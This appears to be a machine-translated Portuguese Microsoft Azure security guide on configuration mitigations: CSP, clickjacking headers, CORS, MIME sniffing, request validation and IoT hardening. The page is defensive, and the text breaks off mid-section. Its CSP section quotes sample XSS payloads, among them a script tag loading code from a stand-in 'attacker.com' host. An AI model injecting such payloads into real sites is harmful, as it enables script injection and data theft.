---
title: Gestão de configuração para a ferramenta de modelação de ameaças da Microsoft
titleSuffix: Azure
description: Saiba mais sobre a gestão de configuração para a Ferramenta de Modelação de Ameaças. Consulte informações de mitigação e veja exemplos de código.
services: security
documentationcenter: na
author: jegeib
manager: jegeib
editor: jegeib
ms.assetid: na
ms.service: security
ms.subservice: security-develop
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 02/07/2017
ms.author: jegeib
ms.custom: devx-track-js, devx-track-csharp
ms.openlocfilehash: 8cbe6b39bda0815c4981c497c07750136bcc9dba
ms.sourcegitcommit: 867cb1b7a1f3a1f0b427282c648d411d0ca4f81f
ms.translationtype: MT
ms.contentlocale: pt-PT
ms.lasthandoff: 03/19/2021
ms.locfileid: "94517489"
---
# <a name="security-frame-configuration-management--mitigations"></a>Quadro de segurança: | de gestão de configuração Mitigações 
| Produto/Serviço | Artigo |
| --------------- | ------- |
| **Aplicação Web** | <ul><li>[Implementar a Política de Segurança de Conteúdos (CSP) e desativar o javascript inline](#csp-js)</li><li>[Ativar o filtro XSS do navegador](#xss-filter)</li><li>[ASP.NET aplicações devem desativar o rastreio e a depuração antes da implementação](#trace-deploy)</li><li>[Aceda a javascripts de terceiros apenas a partir de fontes fidedignas](#js-trusted)</li><li>[Certifique-se de que as páginas de ASP.NET autenticadas incorporam defesas de reparação ou de tomada de cliques](#ui-defenses)</li><li>[Certifique-se de que apenas as origens fidedignas são permitidas se o CORS estiver ativado em ASP.NET Aplicações Web](#cors-aspnet)</li><li>[Ativar atributo ValideRequest em páginas ASP.NET](#validate-aspnet)</li><li>[Use as versões mais recentes das bibliotecas JavaScript](#local-js)</li><li>[Desativar o cheiro automático de MIME](#mime-sniff)</li><li>[Remova os cabeçalhos padrão do servidor nos Web Sites do Windows Azure para evitar a recolha de impressões digitais](#standard-finger)</li></ul> |
| **Base de dados** | <ul><li>[Configure uma firewall do Windows para acesso ao motor de base de dados](#firewall-db)</li></ul> |
| **API Web** | <ul><li>[Certifique-se de que só são permitidas origens fidedignas se o CORS estiver ativado na ASP.NET Web API](#cors-api)</li><li>[Criptografe secções dos ficheiros de configuração da Web API que contenham dados sensíveis](#config-sensitive)</li></ul> |
| **Dispositivo IoT** | <ul><li>[Certifique-se de que todas as interfaces de administração são protegidas com credenciais fortes](#admin-strong)</li><li>[Certifique-se de que o código desconhecido não pode ser executado em dispositivos](#unknown-exe)</li><li>[Encripte o SO e divisórias adicionais do Dispositivo IoT com bit-locker](#partition-iot)</li><li>[Certifique-se de que apenas os serviços/funcionalidades mínimos estão habilitados nos dispositivos](#min-enable)</li></ul> |
| **Gateway de campo IoT** | <ul><li>[Encripte o SO e divisórias adicionais de IoT Field Gateway com bit-locker](#field-bit-locker)</li><li>[Certifique-se de que as credenciais de login predefinidos do gateway de campo são alteradas durante a instalação](#default-change)</li></ul> |
| **Gateway de nuvem IoT** | <ul><li>[Certifique-se de que o Cloud Gateway implementa um processo para manter o firmware de dispositivos conectados atualizado](#cloud-firmware)</li></ul> |
| **Limite de confiança da máquina** | <ul><li>[Certifique-se de que os dispositivos têm controlos de segurança de ponto final configurados de acordo com as políticas organizacionais](#controls-policies)</li></ul> |
| **Armazenamento do Azure** | <ul><li>[Garantir uma gestão segura das chaves de acesso ao armazenamento Azure](#secure-keys)</li><li>[Certifique-se de que só são permitidas origens fidedignas se o CORS estiver ativado no armazenamento do Azure](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[Ativar a funcionalidade de estrangulamento de serviço da WCF](#throttling)</li><li>[Divulgação de informação do WCF através de metadados](#info-metadata)</li></ul> | 

## <a name="implement-content-security-policy-csp-and-disable-inline-javascript"></a><a id="csp-js"></a>Implementar a Política de Segurança de Conteúdos (CSP) e desativar o javascript inline

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase SDL**               | Compilar |  
| **Tecnologias aplicáveis** | Genérica |
| **Atributos**              | N/D  |
| **Referências**              | [Uma Introdução à Política de Segurança de Conteúdos,](https://www.html5rocks.com/en/tutorials/security/content-security-policy/) [Referência da Política de Segurança de Conteúdos,](https://content-security-policy.com/) [Funcionalidades de Segurança,](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/) [Introdução à política de segurança de conteúdos,](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy) [Posso utilizar a CSP?](https://caniuse.com/#feat=contentsecuritypolicy) |
| **Passos** | <p>A Política de Segurança de Conteúdos (CSP) é um mecanismo de segurança aprofundado, uma norma W3C, que permite aos proprietários de aplicações web ter controlo sobre o conteúdo incorporado no seu site. O CSP é adicionado como um cabeçalho de resposta HTTP no servidor web e é aplicado no lado do cliente por navegadores. É uma política baseada em listas permitida - um site pode declarar um conjunto de domínios fidedignos a partir dos quais conteúdos ativos como o JavaScript podem ser carregados.</p><p>A CSP fornece os seguintes benefícios de segurança:</p><ul><li>**Proteção contra o XSS:** Se uma página for vulnerável ao XSS, um intruso pode explorá-la de 2 maneiras:<ul><li>Injetar `<script>malicious code</script>` . Esta exploração não funcionará devido à Restrição Base 1 da CSP</li><li>Injetar `<script src="http://attacker.com/maliciousCode.js"/>` . Esta exploração não funcionará, uma vez que o domínio controlado pelo intruso não estará na lista permitida pela CSP de domínios</li></ul></li><li>**Controlo sobre a exfiltração de dados:** Se algum conteúdo malicioso numa página web tentar ligar-se a um website externo e roubar dados, a ligação será abortada pela CSP. Isto porque o domínio alvo não estará na lista permitida pela CSP</li><li>**Defesa contra o click-jacking:** click-jacking é uma técnica de ataque usando a qual um adversário pode enquadrar um site genuíno e forçar os utilizadores a clicar em elementos de UI. Atualmente a defesa contra o click-jacking é conseguida configurando um cabeçalho de resposta- X-Frame-Options. Nem todos os navegadores respeitam este cabeçalho e a ida para a frente CSP será uma forma padrão de se defender contra o click-jacking</li><li>**Relatórios de ataque em tempo real:** Se houver um ataque de injeção num website ativado por CSP, os navegadores desencadearão automaticamente uma notificação para um ponto final configurado no webserver. Desta forma, a CSP serve como um sistema de alerta em tempo real.</li></ul> |

### <a name="example"></a>Exemplo
Política de exemplo: 
```csharp
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
Esta política permite que os scripts carreguem apenas a partir do servidor da aplicação web e do servidor de análise do Google. Os scripts carregados de qualquer outro site serão rejeitados. Quando o CSP é ativado num website, as seguintes funcionalidades são automaticamente desativadas para mitigar os ataques XSS. 

### <a name="example"></a>Exemplo
Os scripts inline não serão executados. Seguem-se exemplos de scripts inline 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick="function(){}">
javascript:alert(1);
```

### <a name="example"></a>Exemplo
As cordas não serão avaliadas como código. 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a name="enable-browsers-xss-filter"></a><a id="xss-filter"></a>Ativar o filtro XSS do navegador

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase SDL**               | Compilar |  
| **Tecnologias aplicáveis** | Genérica |
| **Atributos**              | N/D  |
| **Referências**              | [Filtro de proteção XSS](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) |
| **Passos** | <p>A configuração do cabeçalho de resposta X-XSS-Protection controla o filtro de script do site cruzado do navegador. Este cabeçalho de resposta pode ter os seguintes valores:</p><ul><li>`0:` Isto irá desativar o filtro</li><li>`1: Filter enabled` Se for detetado um ataque de scripts cross-site, a fim de parar o ataque, o navegador irá sanitizar a página</li><li>`1: mode=block : Filter enabled`. Em vez de higienizar a página, quando um ataque XSS é detetado, o navegador impedirá a renderização da página</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. O navegador irá sanitizar a página e denunciar a violação.</li></ul><p>Esta é uma função de Crómio utilizando relatórios de violação de CSP para enviar detalhes para um URI à sua escolha. As últimas 2 opções são consideradas valores seguros.</p>|

## <a name="aspnet-applications-must-disable-tracing-and-debugging-prior-to-deployment"></a><a id="trace-deploy"></a>ASP.NET aplicações devem desativar o rastreio e a depuração antes da implementação

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase SDL**               | Compilar |  
| **Tecnologias aplicáveis** | Genérica |
| **Atributos**              | N/D  |
| **Referências**              | [ASP.NET Debugging Overview](/previous-versions/ms227556(v=vs.140)), [ASP.NET Traceing Overview](/previous-versions/bb386420(v=vs.140)), [Como: Ativar o rastreio para uma aplicação ASP.NET](/previous-versions/0x5wc973(v=vs.140)), [Como: Permitir depurar para aplicações ASP.NET](https://msdn.microsoft.com/library/e8z01xdh(VS.80).aspx) |
| **Passos** | Quando o rastreio é ativado para a página, cada navegador que o solicita também obtém as informações de traço que contêm dados sobre o estado interno do servidor e o fluxo de trabalho. Essa informação pode ser sensível à segurança. Quando a depuragem é ativada para a página, os erros que ocorram no servidor resultam num conjunto de dados de rastreio de pilhas apresentados ao navegador. Esses dados podem expor informações sensíveis à segurança sobre o fluxo de trabalho do servidor. |

## <a name="access-third-party-javascripts-from-trusted-sources-only"></a><a id="js-trusted"></a>Aceda a javascripts de terceiros apenas a partir de fontes fidedignas

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase SDL**               | Compilar |  
| **Tecnologias aplicáveis** | Genérica |
| **Atributos**              | N/D  |
| **Referências**              | N/D  |
| **Passos** | JavaScripts de terceiros só devem ser referenciados a partir de fontes fidedignas. Os pontos finais de referência devem estar sempre no TLS. |

## <a name="ensure-that-authenticated-aspnet-pages-incorporate-ui-redressing-or-click-jacking-defenses"></a><a id="ui-defenses"></a>Certifique-se de que as páginas de ASP.NET autenticadas incorporam defesas de reparação ou de tomada de cliques

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase SDL**               | Compilar |  
| **Tecnologias aplicáveis** | Genérica |
| **Atributos**              | N/D  |
| **Referências**              | [OWASP click-jacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html), [IE Internals - Combate ao click-jacking com opções de quadro-quadro X](/archive/blogs/ieinternals/combating-clickjacking-with-x-frame-options) |
| **Passos** | <p>Click-jacking, também conhecido como um "ataque de reparação de UI", é quando um intruso usa várias camadas transparentes ou opacas para enganar um utilizador a clicar num botão ou link em outra página quando pretendia clicar na página de nível superior.</p><p>Esta camada é conseguida criando uma página maliciosa com um iframe, que carrega a página da vítima. Assim, o intruso está a "sequestrar" cliques destinados à sua página e a encaminhá-los para outra página, provavelmente propriedade de outra aplicação, domínio ou ambos. Para evitar ataques de tomada de clique, desa um conjunto de cabeçalhos de resposta HTTP das opções de quadro-quadro adequados que instruem o navegador a não permitir enquadrar-se de outros domínios</p>|

### <a name="example"></a>Exemplo
O cabeçalho X-FRAME-OPTIONS pode ser definido através do IIS web.config. Web.config código snippet para sites que nunca devem ser enquadrados: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>Exemplo
Web.config código para sites que só devem ser enquadrados por páginas no mesmo domínio: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-aspnet-web-applications"></a><a id="cors-aspnet"></a>Certifique-se de que apenas as origens fidedignas são permitidas se o CORS estiver ativado em ASP.NET Aplicações Web

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase SDL**               | Compilar |  
| **Tecnologias aplicáveis** | Formulários Web, MVC5 |
| **Atributos**              | N/D  |
| **Referências**              | N/D  |
| **Passos** | <p>A segurança do browser impede que uma página Web realize pedidos de AJAX para outro domínio. Esta restrição é chamada de política de mesma origem, e impede um site malicioso de ler dados sensíveis de outro site. No entanto, por vezes, pode ser necessário expor as APIs de forma segura quais outros sites podem consumir. Cross Origin Resource Sharing (CORS) é uma norma W3C que permite que um servidor relaxe a política de mesma origem. Utilizando o CORS, um servidor pode explicitamente permitir alguns pedidos de origem cruzada enquanto rejeita outros.</p><p>O CORS é mais seguro e flexível do que as técnicas anteriores, como a JSONP. No seu cerne, permitir que o CORS se traduza em adicionar alguns cabeçalhos de resposta HTTP (Access-Control-*) à aplicação web, o que pode ser feito de várias maneiras.</p>|

### <a name="example"></a>Exemplo
Se o acesso a Web.config estiver disponível, então o CORS pode ser adicionado através do seguinte código: 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="https://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>Exemplo
Se o acesso a web.config não estiver disponível, então o CORS pode ser configurado adicionando o seguinte código CSharp: 
```csharp
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://example.com")
```

Por favor, note que é fundamental garantir que a lista de origens no atributo "Acesso-Control-Allow-Origin" seja definida como um conjunto finito e fidedigno de origens. Não configurar isto de forma inadequada (por exemplo, definir o valor como '*') permitirá que sites maliciosos desencadeiem pedidos de origem cruzada para a aplicação web >sem quaisquer restrições, tornando assim a aplicação vulnerável a ataques de CSRF. 

## <a name="enable-validaterequest-attribute-on-aspnet-pages"></a><a id="validate-aspnet"></a>Ativar atributo ValideRequest em páginas ASP.NET

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase SDL**               | Compilar |  
| **Tecnologias aplicáveis** | Formulários Web, MVC5 |
| **Atributos**              | N/D  |
| **Referências**              | [Solicitar validação - Prevenção de ataques de scripts](https://www.asp.net/whitepapers/request-validation) |
| **Passos** | <p>A validação do pedido, uma característica de ASP.NET desde a versão 1.1, impede o servidor de aceitar conteúdo que contenha HTML não codificado. Esta funcionalidade foi concebida para ajudar a prevenir alguns ataques de injeção de scripts, através dos quais o código de script do cliente ou HTML pode ser submetido inconscientemente a um servidor, armazenado e depois apresentado a outros utilizadores. Recomendamos ainda vivamente que valide todos os dados de entrada e o HTML os codifique quando apropriado.</p><p>A validação do pedido é realizada comparando todos os dados de entrada com uma lista de valores potencialmente perigosos. Se ocorrer uma partida, ASP.NET levanta `HttpRequestValidationException` um . Por predefinição, a função de Validação de Pedido está ativada.</p>|

### <a name="example"></a>Exemplo
No entanto, esta funcionalidade pode ser desativada ao nível da página: 
```XML
<%@ Page validateRequest="false" %> 
```
ou, ao nível da aplicação 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
Por favor, note que a função de validação de pedido não é suportada e não faz parte do pipeline MVC6. 

## <a name="use-locally-hosted-latest-versions-of-javascript-libraries"></a><a id="local-js"></a>Use as versões mais recentes das bibliotecas JavaScript

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase SDL**               | Compilar |  
| **Tecnologias aplicáveis** | Genérica |
| **Atributos**              | N/D  |
| **Referências**              | N/D  |
| **Passos** | <p>Os desenvolvedores que usam bibliotecas javaScript padrão como jQuery devem usar versões aprovadas de bibliotecas javaScript comuns que não contenham falhas de segurança conhecidas. Uma boa prática é utilizar a versão mais recente das bibliotecas, uma vez que contêm correções de segurança para vulnerabilidades conhecidas nas suas versões mais antigas.</p><p>Se a versão mais recente não puder ser utilizada por razões de compatibilidade, devem ser utilizadas as versões mínimas abaixo.</p><p>Versões mínimas aceitáveis:</p><ul><li>**JQuery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>JQuery Valide 1.9</li><li>JQuery Mobile 1.0.1</li><li>Ciclo JQuery 2.99</li><li>JQuery DataTables 1.9.0</li></ul></li><li>**Kit de ferramentas de controlo do Ajax**<ul><li>Conjunto de ferramentas de controlo do Ajax 40412</li></ul></li><li>**ASP.NET Formas Web e Ajax**<ul><li>ASP.NET Formas Web e Ajax 4</li><li>ASP.NET Ajax 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>Nunca carregue nenhuma biblioteca JavaScript de sites externos, como CDNs públicos</p>|

## <a name="disable-automatic-mime-sniffing"></a><a id="mime-sniff"></a>Desativar o cheiro automático de MIME

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase SDL**               | Compilar |  
| **Tecnologias aplicáveis** | Genérica |
| **Atributos**              | N/D  |
| **Referências**              | [IE8 Security Part V: Proteção Integral,](/archive/blogs/ie/ie8-security-part-v-comprehensive-protection) [Tipo MIME](https://en.wikipedia.org/wiki/Mime_type) |
| **Passos** | O cabeçalho X-Content-Type-Options é um cabeçalho HTTP que permite aos desenvolvedores especificar que o seu conteúdo não deve ser meifrado por MIME. Este cabeçalho foi concebido para atenuar MIME-Sniffing ataques. Para cada página que possa conter conteúdo controlável do utilizador, deve utilizar o número de opções de tipo de conteúdo http:nosniff. Para ativar o cabeçalho necessário globalmente para todas as páginas da aplicação, pode fazer uma das seguintes|

### <a name="example"></a>Exemplo
Adicione o cabeçalho no ficheiro web.config se a aplicação for hospedada pelos Serviços de Informação da Internet (IIS) 7. 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>Exemplo
Adicione o cabeçalho através do Global Application \_ BeginRequest 
```csharp
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>Exemplo
Implementar módulo HTTP personalizado 
```csharp
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>Exemplo
Pode ativar o cabeçalho necessário apenas para páginas específicas, adicionando-o a respostas individuais: 

```csharp
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a name="remove-standard-server-headers-on-windows-azure-web-sites-to-avoid-fingerprinting"></a><a id="standard-finger"></a>Remova os cabeçalhos padrão do servidor nos Web Sites do Windows Azure para evitar a recolha de impressões digitais

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase SDL**               | Compilar |  
| **Tecnologias aplicáveis** | Genérica |
| **Atributos**              | EnvironmentType - Azure |
| **Referências**              | [Remoção de cabeçalhos de servidor padrão nos Web Sites do Windows Azure](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
| **Passos** | Cabeçalhos como Server, X-Powered-By, X-AspNet-Version revelam informações sobre o servidor e as tecnologias subjacentes. Recomenda-se suprimir estes cabeçalhos, evitando assim a recolha de impressões digitais da aplicação |

## <a name="configure-a-windows-firewall-for-database-engine-access"></a><a id="firewall-db"></a>Configure uma firewall do Windows para acesso ao motor de base de dados

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Base de Dados | 
| **Fase SDL**               | Compilar |  
| **Tecnologias aplicáveis** | SQL Azure, OnPrem |
| **Atributos**              | N/A, VERSÃO SQL - V12 |
| **Referências**              | [Como configurar uma firewall de base de dados Azure SQL](../../azure-sql/database/firewall-configure.md), [Configurar uma firewall do Windows para acesso ao motor de base de dados](/sql/database-engine/configure-windows/configure-a-windows-firewall-for-database-engine-access) |
| **Passos** | Os sistemas de firewall ajudam a prevenir o acesso não autorizado a recursos do computador. Para aceder a uma instância do SqL Server Database Engine através de uma firewall, tem de configurar a firewall do computador que executa o SQL Server para permitir o acesso |

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-aspnet-web-api"></a><a id="cors-api"></a>Certifique-se de que só são permitidas origens fidedignas se o CORS estiver ativado na ASP.NET Web API

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | API Web | 
| **Fase SDL**               | Compilar |  
| **Tecnologias aplicáveis** | MVC 5 |
| **Atributos**              | N/D  |
| **Referências**              | [Habilitação de pedidos de origem cruzada em ASP.NET Web API 2](https://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [ASP.NET Web API - CORS Support in ASP.NET Web API 2](/archive/msdn-magazine/2013/december/asp-net-web-api-cors-support-in-asp-net-web-api-2) |
| **Passos** | <p>A segurança do browser impede que uma página Web realize pedidos de AJAX para outro domínio. Esta restrição é chamada de política de mesma origem, e impede um site malicioso de ler dados sensíveis de outro site. No entanto, por vezes, pode ser necessário expor as APIs de forma segura quais outros sites podem consumir. Cross Origin Resource Sharing (CORS) é uma norma W3C que permite que um servidor relaxe a política de mesma origem.</p><p>Utilizando o CORS, um servidor pode explicitamente permitir alguns pedidos de origem cruzada enquanto rejeita outros. O CORS é mais seguro e flexível do que as técnicas anteriores, como a JSONP.</p>|

### <a name="example"></a>Exemplo
No App_Start/WebApiConfig.cs, adicione o seguinte código ao método WebApiConfig.Register 
```csharp
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>Exemplo
O atributo EnableCors pode ser aplicado aos métodos de ação num controlador da seguinte forma: 

```csharp
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

Por favor, note que é fundamental garantir que a lista de origens no atributo EnableCors está definida para um conjunto finito e confiável de origens. Não configurar isto de forma inadequada (por exemplo, definir o valor como '*') permitirá que sites maliciosos desencadeiem pedidos de origem cruzada à API sem quaisquer restrições, >tornando assim a API vulnerável a ataques CSRF. O EnableCors pode ser decorado ao nível do controlador. 

### <a name="example"></a>Exemplo
Para desativar o CORS num determinado método de uma classe, o atributo DisableCors pode ser utilizado como mostrado abaixo: 
```csharp
[EnableCors("https://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of the [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | API Web | 
| **Fase SDL**               | Compilar |  
| **Tecnologias aplicáveis** | MVC 6 |
| **Atributos**              | N/D  |
| **Referências**              | [Habilitação de pedidos de origem cruzada (CORS) em ASP.NET Core 1.0](https://docs.asp.net/en/latest/security/cors.html) |
| **Passos** | <p>No ASP.NET Core 1.0, o CORS pode ser ativado quer através de middleware, quer utilizando o MVC. Ao utilizar o MVC para ativar o CORS, os mesmos serviços CORS são utilizados, mas o middleware CORS não é.</p>|

**Abordagem-1** Ativar o CORS com middleware: Para ativar o CORS para toda a aplicação adicione o middleware CORS ao pipeline de pedido utilizando o método de extensão UseCors. Uma política de origem cruzada pode ser especificada ao adicionar o middleware CORS utilizando a classe CorsPolicyBuilder. Há duas maneiras de fazer isto:

### <a name="example"></a>Exemplo
A primeira é chamar UseCors com um lambda. A lambda leva um objeto CorsPolicyBuilder: 
```csharp
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("https://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>Exemplo
A segunda é definir uma ou mais políticas CORS nomeadas e, em seguida, selecionar a política pelo nome no tempo de execução. 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("https://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**Abordagem-2** Permitir o CORS em MVC: Os desenvolvedores podem, em alternativa, utilizar o MVC para aplicar CORS específico por ação, por controlador ou globalmente para todos os controladores.

### <a name="example"></a>Exemplo
Por ação: Especificar uma política CORS para uma ação específica adicione o atributo [EnableCors] à ação. Especifique o nome da apólice. 
```csharp
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>Exemplo
Por controlador: 
```csharp
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>Exemplo
Globalmente: 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
Por favor, note que é fundamental garantir que a lista de origens no atributo EnableCors está definida para um conjunto finito e confiável de origens. Não configurar isto de forma inadequada (por exemplo, definir o valor como '*') permitirá que sites maliciosos desencadeiem pedidos de origem cruzada à API sem quaisquer restrições, >tornando assim a API vulnerável a ataques CSRF. 

### <a name="example"></a>Exemplo
Para desativar o CORS para um controlador ou ação, utilize o atributo [DisableCors]. 
```csharp
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

## <a name="encrypt-sections-of-web-apis-configuration-files-that-contain-sensitive-data"></a><a id="config-sensitive"></a>Criptografe secções dos ficheiros de configuração da Web API que contenham dados sensíveis

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | API Web | 
| **Fase SDL**               | Implementação |  
| **Tecnologias aplicáveis** | Genérica |
| **Atributos**              | N/D  |
| **Referências**              | [Como: Criptografar secções de configuração em ASP.NET 2.0 Utilizando o DPAPI](/previous-versions/msp-n-p/ff647398(v=pandp.10)), [Especificando um Fornecedor de Configuração Protegido](/previous-versions/68ze1hb2(v=vs.140)), [Usando o cofre de chave Azure para proteger os segredos da aplicação](/azure/architecture/multitenant-identity/web-api) |
| **Passos** | Ficheiros de configuração como o Web.config, appsettings.jsligados são frequentemente utilizados para conter informações confidenciais, incluindo nomes de utilizador, palavras-passe, cadeias de ligação de bases de dados e chaves de encriptação. Se não proteger estas informações, a sua aplicação é vulnerável a intrusos ou utilizadores maliciosos que obtenham informações sensíveis, tais como nomes de utilizadores de conta e palavras-passe, nomes de bases de dados e nomes de servidores. Com base no tipo de implementação (azure/on-prem), criptografe as secções sensíveis de ficheiros config usando DPAPI ou serviços como o Azure Key Vault. |

## <a name="ensure-that-all-admin-interfaces-are-secured-with-strong-credentials"></a><a id="admin-strong"></a>Certifique-se de que todas as interfaces de administração são protegidas com credenciais fortes

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Dispositivo IoT | 
| **Fase SDL**               | Implementação |  
| **Tecnologias aplicáveis** | Genérica |
| **Atributos**              | N/D  |
| **Referências**              | N/D  |
| **Passos** | Quaisquer interfaces administrativas que o dispositivo ou gateway de campo exponha devem ser protegidas com credenciais fortes. Além disso, quaisquer outras interfaces expostas como WiFi, SSH, ações de ficheiros, FTP devem ser protegidas com credenciais fortes. Não devem ser utilizadas palavras-passe fracas predefinidos. |

## <a name="ensure-that-unknown-code-cannot-execute-on-devices"></a><a id="unknown-exe"></a>Certifique-se de que o código desconhecido não pode ser executado em dispositivos

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Dispositivo IoT | 
| **Fase SDL**               | Compilar |  
| **Tecnologias aplicáveis** | Genérica |
| **Atributos**              | N/D  |
| **Referências**              | [Ativar encriptação de dispositivo secure boot e bit-locker no Windows 10 IoT Core](/windows/iot-core/secure-your-device/securebootandbitlocker) |
| **Passos** | O Boot Seguro UEFI restringe o sistema apenas para permitir a execução de binários assinados por uma autoridade especificada. Esta funcionalidade impede que o código desconhecido seja executado na plataforma e potencialmente enfraqueca a postura de segurança da mesmo. Ativar o Boot Seguro UEFI e restringir a lista de autoridades de certificados que são confiáveis para assinar código. Assine todos os códigos que são implantados no dispositivo usando uma das autoridades de confiança. |

## <a name="encrypt-os-and-additional-partitions-of-iot-device-with-bit-locker"></a><a id="partition-iot"></a>Encripte o SO e divisórias adicionais do Dispositivo IoT com bit-locker

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Dispositivo IoT | 
| **Fase SDL**               | Compilar |  
